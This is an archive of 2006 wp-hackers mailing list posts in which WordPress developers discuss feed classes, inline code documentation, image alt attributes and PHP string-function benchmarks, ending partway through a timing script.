From wphackers at jamietalbot.com  Wed Feb 15 12:48:54 2006
From: wphackers at jamietalbot.com (Jamie Talbot)
Date: Wed Feb 15 12:50:49 2006
Subject: [wp-hackers] Filter Hooks for Enclosures
In-Reply-To: <43F09414.5010707@jamietalbot.com>
References: <a0159cd30602130122o50958aa9tcf9606dd808a7e7f@mail.gmail.com>	<43F08328.9050900@jamietalbot.com>	<43F09120.1000907@midnightcircus.com>
	<43F09414.5010707@jamietalbot.com>
Message-ID: <43F32336.6080202@jamietalbot.com>

-----BEGIN PGP SIGNED MESSAGE-----
Hash: SHA1

Jamie Talbot wrote:
> I definitely like the feeds as objects idea.  A base feed class WPFeed with vars to hold all
> available information that could be subtyped for different feed flavours, WPAtom, WPRSS each with
> their own methods of using that data would be nice.  It would also be nicely future proof when the
> next latest and greatest feed format comes along as it would only require a new class with its own
> 'print' method.
> 
> If converting to XML was a trivial task already implemented, that might be cool too.
> 
> Is there mileage in this?
> 
> Jamie.
> 
> --
> http://jamietalbot.com

Well, even if I took this *totally* out of context and even if there isn't mileage in it, I went
ahead anyway and wrote a prototype class based feed structure and the rationale for it.  Owen's
already left a comment giving his thoughts, I wonder if you might do the same?

http://jamietalbot.com/archives/2006/02/15/the-case-for-feeds-as-classes/

Cheers,

Jamie.

- --
http://jamietalbot.com
-----BEGIN PGP SIGNATURE-----
Version: GnuPG v1.2.5 (MingW32)
Comment: Using GnuPG with Mozilla - http://enigmail.mozdev.org

iD8DBQFD8yM2rovxfShShFARAqnLAKCQeXjth4rbjMdWIYaE/TMkZhD9EwCePyST
bMZF8eJqPmq8IyP/dloj4NE=
=msCh
-----END PGP SIGNATURE-----
From rbowen at rcbowen.com  Wed Feb 15 14:37:01 2006
From: rbowen at rcbowen.com (Rich Bowen)
Date: Wed Feb 15 14:38:49 2006
Subject: [wp-hackers] Inline documentation
Message-ID: <43F33C8D.2010509@rcbowen.com>

Is there a philosophical objection to having documentation (ie,
comments, perhaps PHPDoc) in the code that states what a given function
does? Stated differently, if I were to submit patches containing a brief
description of the function, as well as expected arguments and expected
return values, would there be a chance of such patches being applied, or
would I be better advised to use my time on other ventures?

-- 
Rich Bowen
rbowen@rcbowen.com
From jason at zenenet.com  Wed Feb 15 16:30:27 2006
From: jason at zenenet.com (Jason S.)
Date: Wed Feb 15 16:32:15 2006
Subject: [wp-hackers] The alt tag
In-Reply-To: <43F3135E.9040407@tamba2.org.uk>
References: <43F3135E.9040407@tamba2.org.uk>
Message-ID: <43F35723.2000504@zenenet.com>

Podz wrote:
> http://wordpress.org/support/topic/61228?replies=2#post-326996
> Poster wants to use images as links. She can't see a way to add alt or
> title attributes to the images and the lack of an alt tag means that WP
> is outputting invalid xhtml.
> Or are we both missing something ?
> 
> Having had a look at that page (mine is much abbreviated) in 2.0.1, it
> would seem in need of an overhaul as I'm sure that's not changed in a
> very long time.
> 
> P.

I'm going to give my feedback, but I want other's to answer first.
If someone knows THAT MUCH about specifications and the like, it it
impossible for them to click the 'HTML' button in the toolbar and
manually enter in the alt tag?

I'm really REALLY not a big fan of image manipulation menus, especially
for something as little an alt tag.

If they know these things, surely they know how to edit HTML.

On the flip side, if undefined, wordpress probably should populate the
alt tag with the title specified in the image uploader.
From skeltoac at gmail.com  Wed Feb 15 16:42:03 2006
From: skeltoac at gmail.com (Andy Skelton)
Date: Wed Feb 15 16:43:48 2006
Subject: [wp-hackers] The alt tag
In-Reply-To: <43F35723.2000504@zenenet.com>
References: <43F3135E.9040407@tamba2.org.uk> <43F35723.2000504@zenenet.com>
Message-ID: <e6ec604d0602150842g7a5e69a6wad45d51bf53863ec@mail.gmail.com>

On 2/15/06, Jason S. <jason@zenenet.com> wrote:
> I'm going to give my feedback, but I want other's to answer first.
> If someone knows THAT MUCH about specifications and the like, it it
> impossible for them to click the 'HTML' button in the toolbar and
> manually enter in the alt tag?

Clarifying for Podz: she's adding links, not posting links.
From nuclearmoose at gmail.com  Wed Feb 15 16:44:33 2006
From: nuclearmoose at gmail.com (Craig)
Date: Wed Feb 15 16:46:19 2006
Subject: [wp-hackers] The alt tag
In-Reply-To: <43F35723.2000504@zenenet.com>
References: <43F3135E.9040407@tamba2.org.uk> <43F35723.2000504@zenenet.com>
Message-ID: <5aa3aa0602150844l3dba7065h63dcedfdf04468b2@mail.gmail.com>

Jason said:
"On the flip side, if undefined, wordpress probably should populate the
alt tag with the title specified in the image uploader."

My preference would be simply empty quotes -- alt="" because semantically an
alt tag is not a title, it is information about the image. That is why there
is a title tag. :-)

Craig.
Nuclear Moose.
From podz at tamba2.org.uk  Wed Feb 15 16:46:26 2006
From: podz at tamba2.org.uk (Podz)
Date: Wed Feb 15 16:47:44 2006
Subject: [wp-hackers] The alt tag
In-Reply-To: <43F35723.2000504@zenenet.com>
References: <43F3135E.9040407@tamba2.org.uk> <43F35723.2000504@zenenet.com>
Message-ID: <43F35AE2.8060507@tamba2.org.uk>

Jason S. wrote:
> Podz wrote:
>> http://wordpress.org/support/topic/61228?replies=2#post-326996
>> Poster wants to use images as links. She can't see a way to add alt or
>> title attributes to the images and the lack of an alt tag means that WP
>> is outputting invalid xhtml.
>> Or are we both missing something ?
>>
>> Having had a look at that page (mine is much abbreviated) in 2.0.1, it
>> would seem in need of an overhaul as I'm sure that's not changed in a
>> very long time.
>>
>> P.
> 
> I'm going to give my feedback, but I want other's to answer first.
> If someone knows THAT MUCH about specifications and the like, it it
> impossible for them to click the 'HTML' button in the toolbar and
> manually enter in the alt tag?
> 

Sorry - I should have been clearer
Options > Links > Add Link

I've played more though and it's not that WP's code is off. It's that
the page in question is poor.

The 'Link Name' becomes the alt tag if an image is used.
The 'Short description' serves as both the title tag and the words that
appear under the link when output.
The 'Notes' does something ?

So right now with default calls, she can have images with a title and
the words underneath, or images but no titles. And the Name = alt tag
could do with clearing up ?

P.
From carthik at gmail.com  Wed Feb 15 16:53:23 2006
From: carthik at gmail.com (Carthik Sharma)
Date: Wed Feb 15 16:55:11 2006
Subject: [wp-hackers] Inline documentation
In-Reply-To: <43F33C8D.2010509@rcbowen.com>
References: <43F33C8D.2010509@rcbowen.com>
Message-ID: <80f75db0602150853o510486b3p4ea2aaa2558a1c90@mail.gmail.com>

On 2/15/06, Rich Bowen <rbowen@rcbowen.com> wrote:
> Is there a philosophical objection to having documentation (ie,
> comments, perhaps PHPDoc) in the code that states what a given function
> does? Stated differently, if I were to submit patches containing a brief
> description of the function, as well as expected arguments and expected
> return values, would there be a chance of such patches being applied, or
> would I be better advised to use my time on other ventures?
>

Hi Rich,

This is the third time I remember someone bringing it up. Once
previously it was frowned upon saying it would increase the file sizes
and lead to bloat, which I don't agree with. This would be a
worthwhile project, in my opinion. Using PHPXref/PHPDoc compatible
comments would go a long way to improve readability and understanding
of the code.

Good luck in getting a response from someone with commit priviledges.

Carthik.
> --
> Rich Bowen
> rbowen@rcbowen.com
> _______________________________________________
> wp-hackers mailing list
> wp-hackers@lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>


--
Ph.D. Candidate
University of Central Florida
Homepage: http://carthik.net
From nuclearmoose at gmail.com  Wed Feb 15 17:01:26 2006
From: nuclearmoose at gmail.com (Craig)
Date: Wed Feb 15 17:03:14 2006
Subject: [wp-hackers] Inline documentation
In-Reply-To: <80f75db0602150853o510486b3p4ea2aaa2558a1c90@mail.gmail.com>
References: <43F33C8D.2010509@rcbowen.com>
	<80f75db0602150853o510486b3p4ea2aaa2558a1c90@mail.gmail.com>
Message-ID: <5aa3aa0602150901y1317ec46n5e0e23e22bac9013@mail.gmail.com>

As someone who wants to learn PHP via dissecting WordPress, I'd love to see
this. I think it would be worth the extra cost of file weight. Besides,
"bloat" is really about functionality that is better attached via plugin or
other means, and should never be used in conjunction with adding value to
code by making it easier to understand and therefore use, change, or
improve.

Craig.
From nuclearmoose at gmail.com  Wed Feb 15 17:03:12 2006
From: nuclearmoose at gmail.com (Craig)
Date: Wed Feb 15 17:05:03 2006
Subject: [wp-hackers] The alt tag
In-Reply-To: <5aa3aa0602150844l3dba7065h63dcedfdf04468b2@mail.gmail.com>
References: <43F3135E.9040407@tamba2.org.uk> <43F35723.2000504@zenenet.com>
	<5aa3aa0602150844l3dba7065h63dcedfdf04468b2@mail.gmail.com>
Message-ID: <5aa3aa0602150903s74ccf2cof0d48d499d367404@mail.gmail.com>

My response is not very clear, in retrospect, so I'm including a portion of
a CommuntyMX article written by Zoe Gillinwater:

Alt text should not *describe* the image, it should *replace* it.

The rule that deals with alt text in Section 508 is 1194.22 (a):

A text equivalent for every non-text element shall be provided (e.g., via
"alt", "longdesc", or in element content).

Source: Section
508<http://www.section508.gov/index.cfm?FuseAction=Content&ID=12#Web>

The WAI's Web Content Accessibility Guidelines (WCAG) 1.0 checkpoint that
deals with alt text is 1.1:

Provide a text equivalent for every non-text element (e.g., via "alt",
"longdesc", or in element content). *This includes*: images, graphical
representations of text (including symbols), image map regions, animations (
e.g., animated GIFs), applets and programmatic objects, ASCII art, frames,
scripts, images used as list bullets, spacers, graphical buttons, sounds
(played with or without user interaction), stand-alone audio files, audio
tracks of video, and video. [Priority 1]

Source: w3 <http://www.w3.org/TR/WCAG10/#tech-text-equivalent>

Both of these guidelines state that the alt text should be an equivalent,
not a description. In other words, the alt text should fulfill the same
function that the image does by presenting the message the image is supposed
to convey in a textual instead of visual way.

For instance, let's say you use an image of a magnifying glass as a link to
your search page. A description of this image would be "magnifying glass,"
but this text does not help a non-visual user deduce what the purpose of the
magnifying glass image is. Instead, adding "search" as the alt text
adequately describes the meaning or purpose of the image, rather than the
image itself. Similarly, if you use an image of an arrow as a link to the
full text of an article, use "read more about Article X" as the alt text
instead of "arrow."

Making sure that images have text equivalents rather than descriptions also
means it's unnecessary to include words such as "image of" in your alt text.
So, instead of using "Widget Company logo" as the alt text for your logo
image, just use "Widget Company." That's a good text equivalent for the logo
and is all the non-visual user needs. Similarly, for the picture of Widget
Number One on your page, just use "Widget Number One" as the alt text, not
"image of Widget Number One."

Providing good text equivalents instead of descriptions becomes more
difficult with more complicated graphics, such as photos. Again, think about
the message the image is supposed to be communicating to your users, rather
than what the image looks like.

Let's say your web page is selling dehumidifiers, and on the page you've
included a picture of mold to illustrate the dire consequences that could
arise if a customer does not buy your dehumidifier. You could describe this
image ("Black mold spores cover the lower portion of a wall and baseboard"),
but not only would this be rather gross, it would not convey the same
message to non-visual users that it does to visual users. Instead, put the
image's purpose as the content of the alt attribute. "Excess humidity can
lead to costly and unhealthy mold" might be better alt text, or "ABC
Dehumidifiers reduce the chances of unhealthy mold in your home."
Craig.


On 2/15/06, Craig <nuclearmoose@gmail.com> wrote:
>
> Jason said:
> "On the flip side, if undefined, wordpress probably should populate the
> alt tag with the title specified in the image uploader."
>
> My preference would be simply empty quotes -- alt="" because semantically
> an alt tag is not a title, it is information about the image. That is why
> there is a title tag. :-)
>
> Craig.
> Nuclear Moose.
>
>
>
From false.hopes at gmail.com  Wed Feb 15 17:05:36 2006
From: false.hopes at gmail.com (Robert Deaton)
Date: Wed Feb 15 17:07:21 2006
Subject: [wp-hackers] PHP Coding Practices
In-Reply-To: <ebe43d680602150328n19c9c27cv@mail.gmail.com>
References: <14E9FDD3-6A46-4BBF-AB1E-64AA80C743B4@txfx.net>
	<e6ec604d0602141646y7f5aad0ah6a4eef70ef8dc131@mail.gmail.com>
	<A6DAE9E9-B425-4F16-88D6-0F0C17F5BDDE@txfx.net>
	<a0159cd30602141740r76a49c8dk2e520ddb74b5a252@mail.gmail.com>
	<a491f91d0602141756q1428e417r39f9599520535b9d@mail.gmail.com>
	<a0159cd30602141814p5d638362h662dfa0c20152ce5@mail.gmail.com>
	<a491f91d0602142234k3a3e6ed1n774816772a769ebf@mail.gmail.com>
	<ebe43d680602150328n19c9c27cv@mail.gmail.com>
Message-ID: <a491f91d0602150905j499b6902ma3490798bc8777ad@mail.gmail.com>

On 2/15/06, David House <dmhouse@gmail.com> wrote:
> On 15/02/06, Robert Deaton <false.hopes@gmail.com> wrote:
> > Actually, that's a typecast. Try using an explicit one in the code,
> > you'll notice that it runs the same.
>
> So for all extents and purposes you can iterate an object in PHP4.

You could say it, but its not really true, what you can do is typecast
an object to an array and iterate the array, and it will (most likely)
have what you expect, assuming that you're not trying to set iterator
properties like you could in PHP5. The point here being that, yes, we
can safely use the (array) typecast right now anywhere we are doing a
foreach(), even on objects, since we are supporrting PHP4. In the
future, if support for PHP4 is ever dropped (this is like...a few
years off I'd imagine, but since someone mentioned it), at the point
where someone wants to iterate an object with new code, they simply do
not add the typecast, it is not being forced upon them. Make a comment
saying that its an object, not an array, and move along.

--
--Robert Deaton
http://somethingunpredictable.com
From lists at alexking.org  Wed Feb 15 17:46:14 2006
From: lists at alexking.org (Alex King)
Date: Wed Feb 15 17:48:09 2006
Subject: [wp-hackers] Filter Hooks for Enclosures
In-Reply-To: <43F32336.6080202@jamietalbot.com>
References: <a0159cd30602130122o50958aa9tcf9606dd808a7e7f@mail.gmail.com>	<43F08328.9050900@jamietalbot.com>	<43F09120.1000907@midnightcircus.com>
	<43F09414.5010707@jamietalbot.com>
	<43F32336.6080202@jamietalbot.com>
Message-ID: <8C870449-B218-4BEC-A628-AF039CBF397D@alexking.org>

Why re-invent the wheel then there is already FeedCreator out there  
(which would give us support for more formats to boot)?

Cheers,
--Alex

Personal             Business               FeedLounge
http://alexking.org  http://kingdesign.net  http://feedlounge.com



On Feb 15, 2006, at 5:48 AM, Jamie Talbot wrote:

> I went ahead anyway and wrote a prototype class based feed  
> structure and the rationale for it.
From dmhouse at gmail.com  Wed Feb 15 17:57:20 2006
From: dmhouse at gmail.com (David House)
Date: Wed Feb 15 17:59:08 2006
Subject: [wp-hackers] Filter Hooks for Enclosures
In-Reply-To: <8C870449-B218-4BEC-A628-AF039CBF397D@alexking.org>
References: <a0159cd30602130122o50958aa9tcf9606dd808a7e7f@mail.gmail.com>
	<43F08328.9050900@jamietalbot.com>
	<43F09120.1000907@midnightcircus.com>
	<43F09414.5010707@jamietalbot.com> <43F32336.6080202@jamietalbot.com>
	<8C870449-B218-4BEC-A628-AF039CBF397D@alexking.org>
Message-ID: <ebe43d680602150957r534f1f8bm@mail.gmail.com>

On 15/02/06, Alex King <lists@alexking.org> wrote:
> Why re-invent the wheel then there is already FeedCreator out there
> (which would give us support for more formats to boot)?

This is another real dog-chasing-its-own-tail thread.

Why should we use FeedCreator? Why should we replace about 70 lines of
code with several hundred? I'm yet to be convinced that FeedCreator
and friends can provide anything that a couple of hooks and a bit of
API can't.

Sure, it gives us more feeds. Do we need more feeds? Is there a real
requirement for lots of really obscure feed formats? Plugins can quite
happily define their own feed formats with enough template tags (and
my up-and-coming API to WP_Rewrite).

I just don't see the point.

--
-David House, dmhouse@gmail.com, http://xmouse.ithium.net
From chris.lott at gmail.com  Wed Feb 15 18:21:48 2006
From: chris.lott at gmail.com (Chris Lott)
Date: Wed Feb 15 18:23:37 2006
Subject: [wp-hackers] PHP Coding Practices
In-Reply-To: <7235C637-F6D4-4EB0-9A7D-905F5A79D797@txfx.net>
References: <14E9FDD3-6A46-4BBF-AB1E-64AA80C743B4@txfx.net>
	<7235C637-F6D4-4EB0-9A7D-905F5A79D797@txfx.net>
Message-ID: <9b1b9dab0602151021j166e09fu5487b64940f330ca@mail.gmail.com>

On 2/15/06, Mark Jaquith <mark.wordpress@txfx.net> wrote:
> You know what?  I just ran a bunch of speed tests.  I used small
> haystacks and big haystacks.  I ran strstr($haystack, $needle)
> against strpos($haystack, $needle) !== false (as well as the opposite
> versions with a million iterations each.  strstr() is faster by
> anywhere from 5 to 20%.  Plus, it looks nicer in the code.

This doesn't accord with my experience or others (see, for example,
http://schogini.us/wordpress/index.php/2005/11/21/tips-to-speed-up-php-code/)
-- wonder if something else is going on here?

It's only nominally faster sans real pattern matching, but still...

c
From dstewart at atl.lmco.com  Wed Feb 15 18:33:15 2006
From: dstewart at atl.lmco.com (Doug Stewart)
Date: Wed Feb 15 18:35:02 2006
Subject: [wp-hackers] Inline documentation
In-Reply-To: <5aa3aa0602150901y1317ec46n5e0e23e22bac9013@mail.gmail.com>
References: <43F33C8D.2010509@rcbowen.com>
	<80f75db0602150853o510486b3p4ea2aaa2558a1c90@mail.gmail.com>
	<5aa3aa0602150901y1317ec46n5e0e23e22bac9013@mail.gmail.com>
Message-ID: <43F373EB.7000505@atl.lmco.com>

Craig wrote:
> As someone who wants to learn PHP via dissecting WordPress, I'd love to see
> this. I think it would be worth the extra cost of file weight. Besides,
> "bloat" is really about functionality that is better attached via plugin or
> other means, and should never be used in conjunction with adding value to
> code by making it easier to understand and therefore use, change, or
> improve.
> 

Hey, I've got an idea - ship two .zips, a .dev edition with full 
comments and a .standard edition with no whitespace whatsoever.

Sorry.  I'll go back to lurking.

-- 
----------
Doug Stewart
Systems Administrator/Web Applications Developer
Lockheed Martin Advanced Technology Labs
dstewart@atl.lmco.com
From lists at alexking.org  Wed Feb 15 18:48:30 2006
From: lists at alexking.org (Alex King)
Date: Wed Feb 15 18:50:18 2006
Subject: [wp-hackers] Filter Hooks for Enclosures
In-Reply-To: <ebe43d680602150957r534f1f8bm@mail.gmail.com>
References: <a0159cd30602130122o50958aa9tcf9606dd808a7e7f@mail.gmail.com>
	<43F08328.9050900@jamietalbot.com>
	<43F09120.1000907@midnightcircus.com>
	<43F09414.5010707@jamietalbot.com>
	<43F32336.6080202@jamietalbot.com>
	<8C870449-B218-4BEC-A628-AF039CBF397D@alexking.org>
	<ebe43d680602150957r534f1f8bm@mail.gmail.com>
Message-ID: <4D5BB418-8AB2-4E79-93CE-ADA78C10F7BC@alexking.org>

The main benefit to using an established library is reliability. This  
library has already been tested in the wild and patched, etc. where  
new code we write today has not.

A couple hundred lines of code is not a reason to exclude something -  
code is cheap (and compressed code in a download even more so). We  
could always remove feed types from the library if we felt it  
necessary to reduce the code footprint.

The other benefit is that if we find we need something that  
FeedCreator doesn't have, we can add it and contribute it back to the  
FC project - helping build one great PHP feed creation class rather  
than having dozens around that each do a little of this and a little  
of that.

Cheers,
--Alex

Personal             Business               FeedLounge
http://alexking.org  http://kingdesign.net  http://feedlounge.com


On Feb 15, 2006, at 10:57 AM, David House wrote:

> On 15/02/06, Alex King <lists@alexking.org> wrote:
>> Why re-invent the wheel then there is already FeedCreator out there
>> (which would give us support for more formats to boot)?
>
> This is another real dog-chasing-its-own-tail thread.
>
> Why should we use FeedCreator? Why should we replace about 70 lines of
> code with several hundred?
From r at schestowitz.com  Wed Feb 15 19:19:53 2006
From: r at schestowitz.com (Roy Schestowitz)
Date: Wed Feb 15 19:17:52 2006
Subject: [wp-hackers] Inline documentation
In-Reply-To: <43F373EB.7000505@atl.lmco.com>
References: <43F33C8D.2010509@rcbowen.com>
	<80f75db0602150853o510486b3p4ea2aaa2558a1c90@mail.gmail.com>
	<5aa3aa0602150901y1317ec46n5e0e23e22bac9013@mail.gmail.com>
	<43F373EB.7000505@atl.lmco.com>
Message-ID: <20060215191953.kkqygfrxmunkos40@banana.catalyst2.com>

_____/ On Wed 15 Feb 2006 18:33:15 GMT, [Doug Stewart] wrote : \_____

> Craig wrote:
>> As someone who wants to learn PHP via dissecting WordPress, I'd love to see
>> this. I think it would be worth the extra cost of file weight. Besides,
>> "bloat" is really about functionality that is better attached via plugin or
>> other means, and should never be used in conjunction with adding value to
>> code by making it easier to understand and therefore use, change, or
>> improve.
>>
>
> Hey, I've got an idea - ship two .zips, a .dev edition with full 
> comments and a .standard edition with no whitespace whatsoever.
>
> Sorry.  I'll go back to lurking.

Comment ought to be accumulated and always remain in tact in the repository.
Each time release milestone is reached, run a parser which strips all
comments and publish.

Developers can fetch documented code of interest from the SVN repository,
the nightly, or a Developer Edition. It is worth using the same tactic with
debugging bits in the code. If there are none, something in development
model is probably missed.

Roy

From skippy at skippy.net  Wed Feb 15 19:26:20 2006
From: skippy at skippy.net (Scott Merrill)
Date: Wed Feb 15 19:27:50 2006
Subject: [wp-hackers] Inline documentation
In-Reply-To: <20060215191953.kkqygfrxmunkos40@banana.catalyst2.com>
References: <43F33C8D.2010509@rcbowen.com>	<80f75db0602150853o510486b3p4ea2aaa2558a1c90@mail.gmail.com>	<5aa3aa0602150901y1317ec46n5e0e23e22bac9013@mail.gmail.com>	<43F373EB.7000505@atl.lmco.com>
	<20060215191953.kkqygfrxmunkos40@banana.catalyst2.com>
Message-ID: <43F3805C.2060305@skippy.net>

Roy Schestowitz wrote:
> Comment ought to be accumulated and always remain in tact in the
> repository.
> Each time release milestone is reached, run a parser which strips all
> comments and publish.
> 
> Developers can fetch documented code of interest from the SVN repository,
> the nightly, or a Developer Edition. It is worth using the same tactic with
> debugging bits in the code. If there are none, something in development
> model is probably missed.

I _strongly_ disagree with this approach.  A lot of people have learned
PHP by fiddling with WordPress.  I've personally encouraged a handful of
people to do so.  I think WordPress should be making an effort to
_encourage_ people to work through the code whenever they have an
interest in doing so.  Comments are a good way to help a new developer
learn the internals.

Requiring them to fetch the "development source" seems like a gigantic
waste of time, and a real disservice.

-- 
skippy@skippy.net | http://skippy.net/

gpg --keyserver pgp.mit.edu --recv-keys 9CFA4B35
506C F8BB 17AE 8A05 0B49  3544 476A 7DEC 9CFA 4B35
From VOGELAP at UCMAIL.UC.EDU  Wed Feb 15 19:34:14 2006
From: VOGELAP at UCMAIL.UC.EDU (Vogel, Andrew (vogelap))
Date: Wed Feb 15 19:35:25 2006
Subject: [wp-hackers] Inline documentation
Message-ID: <E7340445E0595A418B2F8DE0AE480E2009AED150@ucmail6.ad.uc.edu>

How much overhead does inline comments add to the code? I cannot imagine
it to be very much. I agree with Scott that the teaching aspects are
important.

-andrew vogel
Manager of Professional Programs
University of Cincinnati
College of Pharmacy 
 

> -----Original Message-----
> From: wp-hackers-bounces@lists.automattic.com 
> [mailto:wp-hackers-bounces@lists.automattic.com] On Behalf Of 
> Scott Merrill
> Sent: Wednesday, February 15, 2006 2:26 PM
> To: wp-hackers@lists.automattic.com
> Subject: Re: [wp-hackers] Inline documentation
> 
> Roy Schestowitz wrote:
> > Comment ought to be accumulated and always remain in tact in the 
> > repository.
> > Each time release milestone is reached, run a parser which 
> strips all 
> > comments and publish.
> > 
> > Developers can fetch documented code of interest from the SVN 
> > repository, the nightly, or a Developer Edition. It is 
> worth using the 
> > same tactic with debugging bits in the code. If there are none, 
> > something in development model is probably missed.
> 
> I _strongly_ disagree with this approach.  A lot of people 
> have learned PHP by fiddling with WordPress.  I've personally 
> encouraged a handful of people to do so.  I think WordPress 
> should be making an effort to _encourage_ people to work 
> through the code whenever they have an interest in doing so.  
> Comments are a good way to help a new developer learn the internals.
> 
> Requiring them to fetch the "development source" seems like a 
> gigantic waste of time, and a real disservice.
> 
> --
> skippy@skippy.net | http://skippy.net/
> 
> gpg --keyserver pgp.mit.edu --recv-keys 9CFA4B35 506C F8BB 
> 17AE 8A05 0B49  3544 476A 7DEC 9CFA 4B35 
> _______________________________________________
> wp-hackers mailing list
> wp-hackers@lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
> 
From r at schestowitz.com  Wed Feb 15 19:51:57 2006
From: r at schestowitz.com (Roy Schestowitz)
Date: Wed Feb 15 19:49:49 2006
Subject: [wp-hackers] Inline documentation
In-Reply-To: <43F3805C.2060305@skippy.net>
References: <43F33C8D.2010509@rcbowen.com>
	<80f75db0602150853o510486b3p4ea2aaa2558a1c90@mail.gmail.com>
	<5aa3aa0602150901y1317ec46n5e0e23e22bac9013@mail.gmail.com>
	<43F373EB.7000505@atl.lmco.com>
	<20060215191953.kkqygfrxmunkos40@banana.catalyst2.com>
	<43F3805C.2060305@skippy.net>
Message-ID: <20060215195157.6xn97h3o5e0ww4k0@banana.catalyst2.com>

_____/ On Wed 15 Feb 2006 19:26:20 GMT, [Scott Merrill] wrote : \_____

> Roy Schestowitz wrote:
>> Comment ought to be accumulated and always remain in tact in the
>> repository.
>> Each time release milestone is reached, run a parser which strips all
>> comments and publish.
>>
>> Developers can fetch documented code of interest from the SVN repository,
>> the nightly, or a Developer Edition. It is worth using the same tactic with
>> debugging bits in the code. If there are none, something in development
>> model is probably missed.
>
> I _strongly_ disagree with this approach.  A lot of people have learned
> PHP by fiddling with WordPress.  I've personally encouraged a handful of
> people to do so.  I think WordPress should be making an effort to
> _encourage_ people to work through the code whenever they have an
> interest in doing so.  Comments are a good way to help a new developer
> learn the internals.
>
> Requiring them to fetch the "development source" seems like a gigantic
> waste of time, and a real disservice.

I respect your point-of-view on this. I /would/, however, like to raise the
issue of debugging, which is equally important, yet has been clearly
neglected. When used excessively, much like comments (in the context of
code), it slows down the program, but I its potential is currently missed
entirely. As some toy pseudo-code:

% BEGIN DEBUG

  % exception handling, long list of pre- and post-conditions

if world<>same
   report using TCP
else
   spew out "Hello World"
emd

% END DEBUG

You can automatically remove such padded bits. Better yet, let wp-testers
run such code and echo exceptions to Trac, or send them directly to a
server (i.e. 'call back home').

It is harmless if one remembers to remove debugging code  at the end
(suitable text editors will fold DEBUG or syntax-highlight it using dim
colours). Otherwise, as in the case of OpenOffice and Office benchmarks,
someone could compare a program which is heavily loaded with 'junk' against
a finalised release.

Roy

From davebytes at comcast.net  Wed Feb 15 19:58:26 2006
From: davebytes at comcast.net (David Chait)
Date: Wed Feb 15 20:00:15 2006
Subject: [wp-hackers] Filter Hooks for Enclosures
References: <a0159cd30602130122o50958aa9tcf9606dd808a7e7f@mail.gmail.com>	<43F08328.9050900@jamietalbot.com>	<43F09120.1000907@midnightcircus.com><43F09414.5010707@jamietalbot.com><43F32336.6080202@jamietalbot.com>
	<8C870449-B218-4BEC-A628-AF039CBF397D@alexking.org>
Message-ID: <00d401c6326a$2fd29590$6e01a8c0@sixfour>

+1

I mean, if we aren't supposed to be looking where we can usefully apply 
pre-existing, tested open-source code to enhance WP, just because existing 
code is (potentially) smaller or faster, then using Magpie (and Snoopy!), 
TinyMCE, dbx, Squirrel's pop3, Inutio's xmlrpc, and other libs sure have 
been bad choices! ;)

I don't think I had realized (until I just looked) how many big chunks of 
'third party' code we rely upon...  And some cool stuff!  I doubt plugin 
writers (like myself) truly know more than a fraction of what power is under 
the hood of existing code.

----- Original Message ----- 
From: "Alex King" <lists@alexking.org>
To: <wp-hackers@lists.automattic.com>
Sent: Wednesday, February 15, 2006 12:46 PM
Subject: Re: [wp-hackers] Filter Hooks for Enclosures


| Why re-invent the wheel then there is already FeedCreator out there
| (which would give us support for more formats to boot)?
|
| Cheers,
| --Alex
|
| Personal             Business               FeedLounge
| http://alexking.org  http://kingdesign.net  http://feedlounge.com
|
|
|
| On Feb 15, 2006, at 5:48 AM, Jamie Talbot wrote:
|
| > I went ahead anyway and wrote a prototype class based feed
| > structure and the rationale for it.
| _______________________________________________
| wp-hackers mailing list
| wp-hackers@lists.automattic.com
| http://lists.automattic.com/mailman/listinfo/wp-hackers
| 

From false.hopes at gmail.com  Wed Feb 15 22:07:54 2006
From: false.hopes at gmail.com (Robert Deaton)
Date: Wed Feb 15 22:09:42 2006
Subject: [wp-hackers] PHP Coding Practices
In-Reply-To: <9b1b9dab0602151021j166e09fu5487b64940f330ca@mail.gmail.com>
References: <14E9FDD3-6A46-4BBF-AB1E-64AA80C743B4@txfx.net>
	<7235C637-F6D4-4EB0-9A7D-905F5A79D797@txfx.net>
	<9b1b9dab0602151021j166e09fu5487b64940f330ca@mail.gmail.com>
Message-ID: <a491f91d0602151407k28e93054rb830980f2db563e1@mail.gmail.com>

On 2/15/06, Chris Lott <chris.lott@gmail.com> wrote:
> On 2/15/06, Mark Jaquith <mark.wordpress@txfx.net> wrote:
http://schogini.us/wordpress/index.php/2005/11/21/tips-to-speed-up-php-code/)
> -- wonder if something else is going on here?

Your tests are not near detailed or run enough times to be a true
indication. Here's something I threw together that might be a more
accurate test, that tries not only real time, but cpu time as well,
because both are very important to us, we need to keep server load
down.

Here's the results with testa.php, which does simple timing. I've run
it three times so you get a good image of the results, and I've
attached the script as testa.txt (I hope txts don't get filtered out)

lappy ~ # php test.php > out
lappy ~ # php test.php >> out
lappy ~ # php test.php >> out
lappy ~ # cat out
strstr at starting point run time: 0.00860
strpos at starting point run time: 0.00824
strstr at mid point run time: 0.00948
strpos at mid point run time: 0.00859
strstr difficult match: 0.01135
strpos difficult match: 0.01045
strstr fail: 0.01075
strpos fail: 0.01057

strstr at starting point run time: 0.00873
strpos at starting point run time: 0.00868
strstr at mid point run time: 0.00907
strpos at mid point run time: 0.00862
strstr difficult match: 0.01142
strpos difficult match: 0.01079
strstr fail: 0.01090
strpos fail: 0.01070

strstr at starting point run time: 0.00866
strpos at starting point run time: 0.00914
strstr at mid point run time: 0.00896
strpos at mid point run time: 0.00884
strstr difficult match: 0.01115
strpos difficult match: 0.01062
strstr fail: 0.01085
strpos fail: 0.01059

As you can see, strstr is slower in all three tests. Next, I did a
test with `time` to see which is faster in system time, run 5 times
each, here are their averages:

strstr (testb.txt):
sys     0m0.006s

strpos (testc.txt):
sys     0m0.003s

So, as you can see, strpos is clearly the faster of the two, digging
into the source of PHP will show you some obvious reasons why. Also,
if anyone is interested on the memory benchmarks of these tests, let
me know.

--
--Robert Deaton
http://somethingunpredictable.com
-------------- next part --------------
<?php
$haystack = 'asimplestring';
$complexhaystack = 'aasasiasimpasimplasimplestringasimplestrng';
$complexhaystack = 'aasasiasimpasimplasimpleasimplestngasimplebringasimplestring';

$start = microtime(true);
for($i = 0; $i < 10000; $i++) {
	strstr($haystack, 'asimple');
}
$end = microtime(true);
printf("strstr at starting point run time: %.5f\n", $end - $start);

$start = microtime(true);
for($i = 0; $i < 10000; $i++) {
	strpos($haystack, 'asimple');
}
$end = microtime(true);
printf("strpos at starting point run time: %.5f\n", $end - $start);

$start = microtime(true);
for($i = 0; $i < 10000; $i++) {
